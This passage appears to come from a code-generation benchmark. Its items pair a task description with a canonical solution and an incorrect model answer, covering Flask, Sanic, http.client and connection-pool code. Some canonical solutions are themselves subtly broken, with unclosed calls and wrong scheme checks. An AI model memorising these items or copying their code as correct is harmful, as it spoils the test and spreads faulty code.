columns = get_episode_data(dataset, episode_id)\n        dataset_info = {\n            \"repo_id\": f\"{dataset_namespace}/{dataset_name}\",\n            \"num_samples\": dataset.num_frames\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_frames,\n            \"num_episodes\": dataset.num_episodes\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_episodes,\n            \"fps\": dataset.fps,\n        }\n        if isinstance(dataset, LeRobotDataset):\n            video_paths = [\n                dataset.meta.get_video_file_path(episode_id, key) for key in dataset.meta.video_keys\n            ]\n            videos_info = [\n                {\"url\": url_for(\"static\", filename=video_path), \"filename\": video_path.parent.name}\n                for video_path in video_paths\n            ]\n            tasks = dataset.meta.episodes[0][\"tasks\"]\n        else:\n            video_keys = [key for key, ft in dataset.features.items() if ft[\"dtype\"] == \"video\"]\n            videos_info = [\n                {\n                    \"url\": f\"https://huggingface.co/datasets/{repo_id}/resolve/main/\"\n                    + dataset.video_path.format(\n                        episode_chunk=int(episode_id) // dataset.chunks_size,\n                        video_key=video_key,\n                        episode_index=episode_id,\n                    ),\n                    \"filename\": video_key,\n                }\n                for video_key in video_keys\n            ]\n\n            response = requests.get(\n                f\"https://huggingface.co/datasets/{repo_id}/resolve/main/meta/episodes.jsonl\"\n            )\n            response.raise_for_status()\n            # Split into lines and parse each line as JSON\n            tasks_jsonl = [json.loads(line) for line in response.text.splitlines() if line.strip()]\n\n            filtered_tasks_jsonl = [row for row in tasks_jsonl if row[\"episode_index\"] == episode_id]\n            tasks = filtered_tasks_jsonl[0][\"tasks\"]\n\n        videos_info[0][\"language_instruction\"] = tasks\n\n        if episodes is None:\n            episodes = list(\n                range(dataset.num_episodes if isinstance(dataset, LeRobotDataset) else dataset.total_episodes)\n            )\n\n        return render_template(\n            \"visualize_dataset_template.html\",\n            episode_id=episode_id,\n            episodes=episodes,\n            dataset_info=dataset_info,\n            videos_info=videos_info,\n            episode_data_csv_str=episode_data_csv_str,\n            columns=columns,\n        )\n\n    app.run(host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, redirect, url_for, render_template\n\ndef run_server(dataset, episodes, host, port, static_folder, template_folder):\n    app = Flask(__name__, static_folder=static_folder, template_folder=template_folder)\n    app.dataset = dataset\n    app.episodes = episodes or []\n\n    @app.route('/')\n    def homepage():\n        if app.episodes:\n            first_episode = app.episodes[0]\n            return redirect(url_for('show_episode', dataset_namespace='default', dataset_name='default', episode_id=first_episode))\n        return render_template('select_dataset.html')\n\n    @app.route('/<dataset_namespace>/<dataset_name>')\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode = 0\n        return redirect(url_for('show_episode', dataset_namespace=dataset_namespace, dataset_name=dataset_name, episode_id=first_episode))\n\n    @app.route('/<dataset_namespace>/<dataset_name>/<int:episode_id>')\n    def show_episode(dataset_namespace, dataset_name, episode_id):\n        episode_data = {\n            'id': episode_id,\n            'videos': ['video1.mp4', 'video2.mp4'],\n            'task_description': f'Task description for episode {episode_id}'\n        }\n        return render_template('episode.html', episode=episode_data)\n\n    app.run(host=host, port=port)"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the http.client library, supporting both HTTP and HTTPS protocols, with optional proxy configuration and proper error handling.\n\nFunction Description: The function performs HTTP requests (GET/POST) to a specified endpoint with given parameters. It handles connection setup (with or without proxy), request sending, response processing, and connection cleanup. It supports both Python 2 and 3 compatibility and includes logging for debugging purposes.\n\nInput:\n- method: [str] - HTTP method to use ('GET' or 'POST')\n- action: [str] - URL path/endpoint to request\n- param: [dict] - Optional dictionary of parameters (default: None)\n- **params: [dict] - Additional parameters as keyword arguments\n\nOutput:\n- Returns: [str] - Response body as string if successful (status code 2xx)\n- Raises: [Exception] - If HTTP status code indicates failure (non-2xx)",
    "Canonical_solution": "from json import loads as jsondecode\nfrom logging import debug, info, warning\ntry:\n    # python 2\n    from httplib import HTTPSConnection, HTTPConnection\n    from urlparse import urlparse, parse_qsl\n    from urllib import urlencode\nexcept ImportError:\n    # python 3\n    from http.client import HTTPSConnection, HTTPConnection\n    from urllib.parse import urlencode, urlparse, parse_qsl\n\nclass Config:\n    ID = None\n    TOKEN = None\n    PROXY = None\n    TTL = None\n\ndef request(method, action, param=None, **params):\n    if param:\n        params.update(param)\n\n    URLObj = urlparse(Config.ID)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    info(\"%s/%s : %s\", URLObj.netloc, action, params)\n\n    if Config.PROXY:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(Config.PROXY)\n        else:\n            conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(URLObj.netloc, URLObj.port)\n    else:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(URLObj.netloc, URLObj.port)\n        else:\n            conn = HTTPSConnection(URLObj.netloc, URLObj.port)\n\n    headers = {}\n\n    if method == \"GET\":\n        if params:\n            action += '?' + urlencode(params)\n        params = \"\"\n    else:\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    params = urlencode(params)\n\n    conn.request(method, action, params, headers)\n    response = conn.getresponse()\n    res = response.read().decode('utf8')\n    conn.close()\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, res)\n        raise Exception(res)\n    else:\n        debug('%s : result:%s', action, res)\n        return res",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import http.client\nimport urllib.parse\nimport logging\nimport sys\n\ndef http_request(method, action, param=None, **params):\n    logging.basicConfig(level=logging.INFO)\n    parsed_url = urllib.parse.urlparse(action)\n    scheme = parsed_url.scheme\n    host = parsed_url.hostname\n    port = parsed_url.port\n    path = parsed_url.path\n\n    proxy_host = params.get('proxy_host')\n    proxy_port = params.get('proxy_port')\n    proxy_user = params.get('proxy_user')\n    proxy_pass = params.get('proxy_pass')\n\n    if scheme == 'https':\n        if proxy_host and proxy_port:\n            conn = http.client.HTTPSConnection(proxy_host, proxy_port)\n            conn.set_debuglevel(1)\n            conn.request(method, path, body=urllib.parse.urlencode({**param, **params}), headers={'Content-Type': 'application/x-www-form-urlencoded'})\n        else:\n            conn = http.client.HTTPSConnection(host, port)\n            conn.set_debuglevel(1)\n            conn.request(method, path, body=urllib.parse.urlencode({**param, **params}), headers={'Content-Type': 'application/x-www-form-urlencoded'})\n    else:\n        if proxy_host and proxy_port:\n            conn = http.client.HTTPConnection(proxy_host, proxy_port)\n            conn.set_debuglevel(1)\n            conn.request(method, path, body=urllib.parse.urlencode({**param, **params}), headers={'Content-Type': 'application/x-www-form-urlencoded'})\n        else:\n            conn = http.client.HTTPConnection(host, port)\n            conn.set_debuglevel(1)\n            conn.request(method, path, body=urllib.parse.urlencode({**param, **params}), headers={'Content-Type': 'application/x-www-form-urlencoded'})\n\n    response = conn.getresponse()\n    if response.status // 100 == 2:\n        return response.read().decode('utf-8')\n    else:\n        error_msg = f\"HTTP Error {response.status}: {response.reason}\"\n        logging.error(error_msg)\n        raise Exception(error_msg)"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints that return different responses, including a main API endpoint, a root endpoint, and a static file endpoint that will be overridden by Nginx.\n\nFunction Description: The code creates a Flask application with three routes:\n1. An API endpoint (\"/api\") that returns a greeting message with Python version information\n2. A root endpoint (\"/\") that returns a basic message\n3. A static file endpoint (\"/content/test.txt\") that returns a message which will be overridden by Nginx\n\nInput: None (Flask automatically handles incoming HTTP requests)\n\nOutput: \n- For \"/api\" endpoint: A string containing a greeting message with Python version\n- For \"/\" endpoint: A string \"API response overriden by Nginx\"\n- For \"/content/test.txt\" endpoint: A string \"Not run, Nginx overrides to serve static file\"",
    "Canonical_solution": "from flask import Flask\ncustom_app = Flask(__name__)\n\n@custom_app.route(\"/api\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@custom_app.route(\"/\")\ndef main():\n    return \"API response overriden by Nginx\"\n\n@custom_app.route(\"/content/test.txt\")\ndef static_test():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == \"__main__\":\n    custom_app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask\nimport sys\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return \"API response overriden by Nginx\"\n\n@app.route('/api')\ndef api():\n    return f\"Hello from API, Python version: {sys.version}\"\n\n@app.route('/content/test.txt')\ndef static_file():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Create a Python class that manages a queue-based system for processing image style transfer requests using a pre-trained PyTorch model, with asynchronous batch processing capabilities.\n\nClass Description: ModelRunner is a class that handles asynchronous processing of image style transfer requests using a PyTorch model. It manages a queue system with configurable batch processing, queue limits, and wait times to efficiently process incoming requests.\n\nAttributes:\n- model_name: str - Path to the pre-trained PyTorch model file\n- queue: list - Stores pending processing tasks\n- queue_lock: asyncio.Lock - Synchronization lock for queue access\n- model: torch.jit.ScriptModule - Loaded PyTorch model\n- needs_processing: asyncio.Event - Signals when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with the specified model file\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Executes the model on the input batch (synchronous)\n- model_runner() -> None - Main processing loop that handles batch processing asynchronously",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw, text\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = torch.jit.load(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\"done_event\": asyncio.Event(loop=app.loop),\n                    \"input\": input,\n                    \"time\": app.loop.time()}\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return text(e.handling_msg, status=e.handling_code)\n\nstyle_transfer_runner = ModelRunner(sys.argv[1])\napp.add_task(style_transfer_runner.model_runner())",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "```python\nimport asyncio\nimport torch\nfrom torch import jit\n\nclass ModelRunner:\n    def __init__(self, model_name: str) -> None:\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = jit.load(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = asyncio.TimerHandle()\n\n    async def schedule_processing_if_needed(self) -> None:\n        async with self.queue_lock:\n            if self.queue and not self.needs_processing.is_set():\n                self.needs_processing.set()\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n        await self.needs_processing.wait()\n        return self.run_model(torch.stack(self.queue))\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        return self.model(batch)\n\n    async def model_runner(self) -> None:\n        while True:\n            await self.schedule_processing_if_needed()\n            await self.needs_processing.wait()\n            if self.queue:\n                batch = torch.stack(self.queue)\n                output = self.run_model(batch)\n                self.queue.clear()\n                self.needs_processing.clear()\n```"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Implement an asynchronous HTTP server using Sanic framework that processes image style transfer requests, with batching and queue management for efficient model inference.\n\nClass Description: ModelRunner is a class that manages a queue of image processing tasks, batches them efficiently, and runs them through a pretrained PyTorch model for style transfer.\n\nAttributes:\n- model_name: str - Name of the pretrained model to use\n- queue: list - List of pending image processing tasks\n- queue_lock: asyncio.Lock - Lock for thread-safe queue operations\n- model: torch.nn.Module - Loaded pretrained model\n- needs_processing: asyncio.Event - Event signaling when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with specified model name\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Runs the model on a batch of inputs (synchronous)\n- model_runner() -> None - Main processing loop that handles batching and model execution\n\nFunction Description: The image endpoint handles HTTP PUT requests containing image data, processes them through the style transfer model, and returns the transformed image.\n\nInput:\n- request: sanic.Request - HTTP request object containing image data in the body\n\nOutput:\n- sanic.response.raw - Processed image in JPEG format, or error message if processing fails",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = get_pretrained_model(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\n            \"done_event\": asyncio.Event(loop=app.loop),\n            \"input\": input,\n            \"time\": app.loop.time()\n        }\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return sanic.response.text(e.handling_msg, status=e.handling_code)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "import asyncio\nimport torch\nimport sanic\nfrom sanic import response\nfrom PIL import Image\nfrom io import BytesIO\nimport torchvision.transforms as transforms\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = self.load_model(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = None\n        self.model_runner_task = asyncio.create_task(self.model_runner())\n\n    def load_model(self, model_name):\n        model = torch.hub.load('pytorch/vision:v0.10.0', 'vgg16', pretrained=True)\n        model.eval()\n        model.to('cuda' if torch.cuda.is_available() else 'cpu')\n        return model\n\n    async def model_runner(self):\n        while True:\n            await self.schedule_processing_if_needed()\n            await asyncio.sleep(1)\n\n    async def schedule_processing_if_needed(self):\n        async with self.queue_lock:\n            if len(self.queue) > 0:\n                self.needs_processing.set()\n                if self.needs_processing_timer:\n                    self.needs_processing_timer.cancel()\n                self.needs_processing_timer = asyncio.create_task(self._delayed_processing())\n\n    async def _delayed_processing(self):\n        await asyncio.sleep(1)\n        await self.process_batch()\n\n    async def process_batch(self):\n        batch_size = 8\n        batch = torch.stack(self.queue[:batch_size])\n        self.queue = self.queue[batch_size:]\n        output = self.run_model(batch)\n        self.needs_processing.clear()\n\n    def run_model(self, batch):\n        with torch.no_grad():\n            return self.model(batch)\n\n    async def process_input(self, input):\n        async with self.queue_lock:\n            self.queue.append(input)\n        await self.schedule_processing_if_needed()\n        await self.needs_processing.wait()\n        return self.process_output()\n\n    def process_output(self):\n        return torch.rand(1, 3, 224, 224)\n\napp = sanic.Sanic(__name__)\n\nrunner = ModelRunner(\"style_transfer_model\")\n\n@app.route(\"/style_transfer\", methods=[\"PUT\"])\nasync def style_transfer(request):\n    image_data = request.body\n    image = Image.open(BytesIO(image_data))\n    transform = transforms.Compose([\n        transforms.Resize((224, 224)),\n        transforms.ToTensor(),\n    ])\n    tensor = transform(image).unsqueeze(0)\n    processed_tensor = await runner.process_input(tensor)\n    processed_image = transforms.ToPILImage()(processed_tensor)\n    buffer = BytesIO()\n    processed_image.save(buffer, format=\"JPEG\")\n    return response.raw(buffer.getvalue(), headers={\"Content-Type\": \"image/jpeg\"})"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a connection pooling system for HTTP and HTTPS connections to efficiently manage and reuse connections to a target server.\n\nClass Description: HTTPConnectionPool is a connection pool implementation that manages HTTP connections to a specific host and port. It provides methods to get, put, and make requests using connections from the pool.\n\nAttributes:\n- scheme: str - The URL scheme (http or https)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Connection and read timeout settings\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage (LIFO queue)\n- block: bool - Whether to block when pool is empty\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Gets a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n\nClass Description: HTTPSConnectionPool extends HTTPConnectionPool to handle HTTPS connections with SSL/TLS configuration.\n\nAttributes:\n- key_file: str - Path to client private key file\n- cert_file: str - Path to client certificate file\n- cert_reqs: str - Certificate requirements\n- ca_certs: str - Path to CA certificates file\n- ssl_version: str - SSL version to use\n- assert_hostname: str - Hostname to verify against certificate\n- assert_fingerprint: str - Expected certificate fingerprint\n\nMethods:\n- _prepare_conn(conn) -> HTTPSConnection - Configures SSL/TLS settings on a connection\n- _new_conn() -> HTTPSConnection - Creates a new HTTPS connection with SSL/TLS configuration",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    SSLError,\n    TimeoutError,\n    ClosedPoolError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nfrom .util.queue import LifoQueue\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        **response_kw\n    ):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n            return response\n        except (SocketError, ProtocolError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout,\n                pool_timeout,\n                release_conn,\n                **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                conn.close()\n            except queue.Empty:\n                break\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    scheme = \"https\"\n    ConnectionCls = HTTPSConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        key_file=None,\n        cert_file=None,\n        cert_reqs=None,\n        ca_certs=None,\n        ssl_version=None,\n        assert_hostname=None,\n        assert_fingerprint=None,\n        **conn_kw\n    ):\n        super(HTTPSConnectionPool, self).__init__(\n            host,\n            port,\n            strict,\n            timeout,\n            maxsize,\n            block,\n            headers,\n            retries,\n            _proxy,\n            _proxy_headers,\n            **conn_kw\n        )\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        conn.set_cert(\n            key_file=self.key_file,\n            cert_file=self.cert_file,\n            cert_reqs=self.cert_reqs,\n            ca_certs=self.ca_certs,\n            assert_hostname=self.assert_hostname,\n            assert_fingerprint=self.assert_fingerprint\n        )\n        conn.ssl_version = self.ssl_version\n        return conn\n\n    def _new_conn(self):\n        conn = super(HTTPSConnectionPool, self)._new_conn()\n        return self._prepare_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import http.client\nimport ssl\nfrom urllib.request import HTTPConnection, HTTPSConnection\nfrom queue import LifoQueue\nimport time\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 30\n\nclass Retry:\n    def __init__(self, retries=3, backoff_factor=0.5):\n        self.retries = retries\n        self.backoff_factor = backoff_factor\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries or Retry()\n        self.pool = LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        for _ in range(maxsize):\n            self._put_conn(self._new_conn())\n\n    def _new_conn(self):\n        return HTTPConnection(self.host, self.port)\n\n    def _get_conn(self, timeout=None):\n        if self.block:\n            try:\n                conn = self.pool.get(timeout=timeout)\n            except queue.Empty:\n                conn = self._new_conn()\n        else:\n            try:\n                conn = self.pool.get_nowait()\n            except queue.Empty:\n                conn = self._new_conn()\n        return conn\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        pass\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, 